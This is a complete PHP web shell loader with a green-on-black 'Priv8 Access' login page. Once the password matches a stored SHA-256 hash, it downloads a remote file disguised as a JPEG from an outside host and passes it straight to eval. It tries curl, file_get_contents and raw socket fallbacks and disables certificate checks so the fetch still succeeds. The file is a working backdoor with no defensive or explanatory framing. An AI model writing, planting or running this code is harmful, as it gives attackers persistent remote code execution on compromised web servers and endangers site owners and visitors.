<?php
session_start();

function getURL($url) {
    $parsed_url = parse_url($url);
    $host = $parsed_url['host'];
    $path = isset($parsed_url['path']) ? $parsed_url['path'] : '/';
    $port = isset($parsed_url['port']) ? $parsed_url['port'] : (isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https' ? 443 : 80);
    $scheme = isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https' ? 'ssl://' : '';

    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    elseif (function_exists('file_get_contents')) {
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'header' => "User-Agent: PHP\r\n"
            ]
        ]);
        return file_get_contents($url, false, $context);
    }
    elseif (function_exists('stream_socket_client')) {
        $socket = @stream_socket_client($scheme . $host . ':' . $port, $errno, $errstr);
        if (!$socket) {
            return false;
        }
        $request = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: PHP\r\nConnection: close\r\n\r\n";
        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) {
            $response .= fgets($socket);
        }
        fclose($socket);
        $body = substr($response, strpos($response, "\r\n\r\n") + 4);
        return $body;
    }
    elseif (function_exists('fsockopen')) {
        $socket = @fsockopen($scheme . $host, $port, $errno, $errstr);
        if (!$socket) {
            return false;
        }
        $request = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: PHP\r\nConnection: close\r\n\r\n";
        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) {
            $response .= fgets($socket);
        }
        fclose($socket);
        $body = substr($response, strpos($response, "\r\n\r\n") + 4);
        return $body;
    }
    else {
        return false;
    }
}

function generate_csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function login_shell() {
    $password_hash = "d786309c581090b412127f7418309827788765ffd326382d10ada6a48d135878"; 

    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
        eval("?>" . getURL("https://haxor-research.com/rimuru.jpg"));
        exit;
    }

    if (isset($_POST['password']) && isset($_POST['csrf_token'])) {
        if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
            echo "<script>alert('Invalid CSRF token!');</script>";
            return;
        }

        $input_password = htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8');
        $input_password_hash = hash('sha256', $input_password);

        if ($input_password_hash === $password_hash) {
            $_SESSION['authenticated'] = true;
            eval("?>" . getURL("https://haxor-research.com/rimuru.jpg"));
            exit;
        } else {
            echo "<script>alert('Access Denied');</script>";
        }
    }

    $csrf_token = generate_csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>HaxorNoname - Priv8 Access</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

    body {
      margin: 0;
      padding: 0;
      background: #000000;
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .terminal-box {
      border: 2px solid #00ff00;
      box-shadow: 0 0 15px #00ff00;
      background: #101010;
      padding: 40px;
      border-radius: 10px;
      width: 380px;
      animation: fadeIn 1.5s ease-in-out;
    }

    .terminal-title {
      font-size: 22px;
      margin-bottom: 20px;
      text-align: center;
      animation: typewriter 2s steps(20) 1 normal both;
      white-space: nowrap;
      overflow: hidden;
      border-right: 2px solid #00ff00;
    }

    label {
      font-size: 14px;
      margin-bottom: 5px;
      display: block;
    }

    input[type="password"] {
      width: 100%;
      padding: 12px;
      background: #000;
      color: #00ff00;
      border: 1px solid #00ff00;
      border-radius: 4px;
      margin-bottom: 15px;
      font-size: 14px;
      transition: all 0.3s ease;
    }

    input[type="password"]:focus {
      outline: none;
      box-shadow: 0 0 5px #00ff00;
    }

    input[type="submit"] {
      width: 100%;
      padding: 12px;
      background: #00ff00;
      color: #000;
      font-weight: bold;
      font-size: 14px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      transition: 0.3s ease;
    }

    input[type="submit"]:hover {
      background: #00cc00;
    }

    @keyframes typewriter {
      0% { width: 0 }
      100% { width: 100% }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="terminal-box">
    <div class="terminal-title">[ ACCESS PRIV8 HAXORNONAME ]</div>
<div class="container">
<form method="post">
<input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token, ENT_QUOTES, 'UTF-8'); ?>">
<input type="password" name="password" autofocus>
</form>
</div>
</body>
</html>
<?php
}

login_shell();
?>
